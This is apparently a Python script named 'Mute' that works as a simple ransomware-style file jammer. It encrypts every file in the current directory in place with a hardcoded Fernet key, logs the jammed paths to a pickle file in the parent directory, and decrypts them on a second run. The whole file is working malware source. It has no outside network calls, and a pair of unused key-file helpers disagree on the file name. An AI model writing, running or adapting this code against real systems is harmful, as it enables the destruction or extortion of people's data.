import glob
import os
import pickle
from os.path import isfile

from cryptography.fernet import Fernet


def generateKey():
    """Generates an encryption key and saves it in a file"""

    key = Fernet.generate_key()
    with open('encryptionKey.key', 'wb') as file:
        file.write(key)


def readKey():
    """Retrieves the previously written encryption key and returns it in a variable"""

    with open('encryptionkey.key', 'rb') as file:
        key = file.read()
    return key


def filesToJam():
    """Looks for files to jam and returns a list of their paths"""

    currentPath = os.getcwd()
    for file in os.listdir(currentPath):
        if file != 'Mute.py' and file != 'Mute.exe':
            if isfile(file):
                listOfFiles.append(os.path.join(currentPath, file))

    return listOfFiles


def checkMode():
    """Checks whether the pickle file list is empty or exists or not"""

    readFiles = readFilePaths(directory_for_pickle)
    if readFiles:
        return True
    else:
        return False


def writeFilePaths(directory_for_pickle, listOfFiles):
    """Writes down the list of files that are encrypted"""

    with open(directory_for_pickle, 'wb') as file:
        pickle.dump(listOfFiles, file)


def readFilePaths(directory_for_pickle):
    """Reads the filepaths of the files that are encrypted"""

    try:
        with open(directory_for_pickle, 'rb') as file:
            readFiles = pickle.load(file)
            file.close()
            return readFiles
    except:
        print("ONLY I SHALL EXIST IN THIS PATH !!!")


def encrypt(listOfFiles, key):
    """Encrypts the files in the current working directory"""
    
    # Converting the key to a Fernet object
    f = Fernet(key)
    for i in listOfFiles:
        with open(i, 'rb') as file:
            realData = file.read()
        encryptedData = f.encrypt(realData)
        with open(i, 'wb') as file:
            file.write(encryptedData)


def decrypt(readFiles, key):
    """Decrypts the files that are encrypted"""

    # Converting the key to a Fernet object
    f = Fernet(key)
    for i in readFiles:
        try:
            with open(i, 'rb') as file:
                encryptedData = file.read()
                file.close()
                realData = f.decrypt(encryptedData)
            with open(i, 'wb') as file:
                file.write(realData)
        except:
            print(i)


if __name__ == '__main__':
    listOfFiles = []

    directory_for_pickle = os.path.dirname(os.getcwd()) + '\\jammedFiles.pkl'
    
    key = b'enBE2eZ5_y1lUInRug7cByWqsITx1L2p6f20PWEQg7g='

    # Getting the list of files in the directory
    listOfFiles = filesToJam()
    readFiles = readFilePaths(directory_for_pickle)

    # If checkMode returns True, that means that the there are files which were
    # previously encrypted and so it will call Decrypt and then
    # delete the file that stored the encrypted files' paths
    if checkMode():
        decrypt(readFiles, key)
        os.remove(directory_for_pickle)

    # If checkMode returns False, that means there are no previously encrypted files and
    # the encrypt function will be called
    # then the writeFilePaths function will write the encrypted files paths
    else:
        encrypt(listOfFiles, key)
        writeFilePaths(directory_for_pickle, listOfFiles)
